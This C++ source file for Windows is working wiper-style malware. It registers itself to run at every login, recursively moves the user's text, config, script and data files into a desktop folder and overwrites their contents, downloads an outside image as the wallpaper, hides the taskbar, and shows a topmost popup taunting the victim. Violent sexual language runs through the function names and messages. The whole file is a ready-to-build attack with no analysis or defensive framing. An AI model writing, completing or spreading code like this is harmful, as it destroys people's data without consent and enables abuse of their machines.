#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <winreg.h>
#include <commctrl.h>
#include <urlmon.h>
#include <tchar.h>
#include <shellapi.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "comctl32.lib")

namespace fs = std::filesystem;

const wchar_t* startup_name = L"Your Computer";

HWND taskbar = FindWindowW(L"Shell_TrayWnd", nullptr);

void hide_taskbar() {
    ShowWindow(taskbar, SW_HIDE);
}

void show_taskbar() {
    ShowWindow(taskbar, SW_SHOW);
}

void add_to_startup() {
    HKEY hKey;
    const wchar_t* run_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

    std::wstring cmd = L"\"";
    cmd += exe_path;
    cmd += L"\"";

    // Open key for reading to check existing value
    if (RegOpenKeyExW(HKEY_CURRENT_USER, run_key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD size = 0;
        DWORD type = 0;
        if (RegQueryValueExW(hKey, startup_name, nullptr, &type, nullptr, &size) == ERROR_SUCCESS && type == REG_SZ) {
            std::vector<wchar_t> buffer(size / sizeof(wchar_t));
            if (RegQueryValueExW(hKey, startup_name, nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer.data()), &size) == ERROR_SUCCESS) {
                std::wstring existing_value(buffer.data());
                if (existing_value == cmd) {
                    RegCloseKey(hKey);
                    return; // Already set
                }
            }
        }
        RegCloseKey(hKey);
    }

    // Open key for writing
    if (RegOpenKeyExW(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, startup_name, 0, REG_SZ, reinterpret_cast<const BYTE*>(cmd.c_str()), static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

void move_and_rape_files() {
    wchar_t* desktop_path = nullptr;
    if (SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &desktop_path) != S_OK) {
        return;
    }
    fs::path target_folder = fs::path(desktop_path) / L"The Raped";
    CoTaskMemFree(desktop_path);

    std::error_code ec;
    fs::create_directories(target_folder, ec);
    if (ec) return;

    std::vector<std::wstring> extensions = {
        L".txt", L".md", L".log", L".cfg", L".ini", L".json",
        L".csv", L".yaml", L".yml", L".py", L".html", L".xml",
        L".tex", L".bat", L".sh"
    };

    wchar_t* home_path = nullptr;
    if (SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &home_path) != S_OK) {
        return;
    }
    fs::path home(home_path);
    CoTaskMemFree(home_path);

    for (auto& p : fs::recursive_directory_iterator(home, fs::directory_options::skip_permission_denied)) {
        if (!p.is_regular_file()) continue;
        fs::path file_path = p.path();
        std::wstring ext = file_path.extension().wstring();
        std::transform(ext.begin(), ext.end(), ext.begin(), ::towlower);

        bool match = false;
        for (const auto& e : extensions) {
            if (ext == e) {
                match = true;
                break;
            }
        }
        if (!match) continue;

        fs::path dest_path = target_folder / file_path.filename();

        // Move file
        std::error_code move_ec;
        fs::rename(file_path, dest_path, move_ec);
        if (move_ec) {
            // Could be permission error or file exists, skip
            continue;
        }

        // Overwrite file content
        std::wofstream ofs(dest_path, std::ios::out | std::ios::trunc);
        if (ofs.is_open()) {
            ofs << L"Raped this file.";
            ofs.close();
        }
    }
}

bool download_wallpaper(const std::wstring& url, const std::wstring& save_path) {
    HRESULT hr = URLDownloadToFileW(nullptr, url.c_str(), save_path.c_str(), 0, nullptr);
    if (SUCCEEDED(hr)) {
        return true;
    } else {
        std::wcerr << L"Failed to download wallpaper: HRESULT " << hr << std::endl;
        return false;
    }
}

void set_wallpaper(const std::wstring& image_path) {
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)image_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        show_taskbar();
        PostQuitMessage(0);
        return 0;
    case WM_CLOSE:
        show_taskbar();
        DestroyWindow(hwnd);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
    // Change this URL to the image you want to use as wallpaper
    std::wstring wallpaper_url = L"https://imgk.timesnownews.com/story/demonic_figure_on_google_earth.png?tr=w-400,h-300,fo-auto";

    wchar_t* home_path = nullptr;
    if (SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &home_path) != S_OK) {
        return 1;
    }
    fs::path wallpaper_path = fs::path(home_path) / L"wallpaper.jpeg";
    CoTaskMemFree(home_path);

    if (download_wallpaper(wallpaper_url, wallpaper_path.wstring())) {
        set_wallpaper(wallpaper_path.wstring());
    }

    add_to_startup();
    move_and_rape_files();

    // Register window class
    const wchar_t CLASS_NAME[] = L"RapedFilesWindowClass";

    WNDCLASS wc = { };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(255, 0, 0)); // red background

    RegisterClass(&wc);

    // Calculate window size and position
    int window_width = 600;
    int window_height = 300;

    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);

    int x_pos = (screen_width - window_width) / 2;
    int y_pos = (screen_height - window_height) / 2;

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME,
        L"Raped Files",
        WS_POPUP,
        x_pos, y_pos, window_width, window_height,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (!hwnd) {
        return 1;
    }

    // Create static text control for label
    HWND hwndLabel = CreateWindowW(
        L"STATIC",
        L"⚠️  WARNING!\nI raped your files, goodluck restoring them!.",
        WS_CHILD | WS_VISIBLE | SS_CENTER | SS_CENTERIMAGE | SS_NOPREFIX | SS_WORDELLIPSIS,
        0, 0, window_width, window_height,
        hwnd,
        nullptr,
        hInstance,
        nullptr
    );

    // Set font for label
    HFONT hFont = CreateFontW(
        20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Arial"
    );
    SendMessage(hwndLabel, WM_SETFONT, (WPARAM)hFont, TRUE);

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    hide_taskbar();

    // Message loop
    MSG msg = { };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);

    return 0;
}
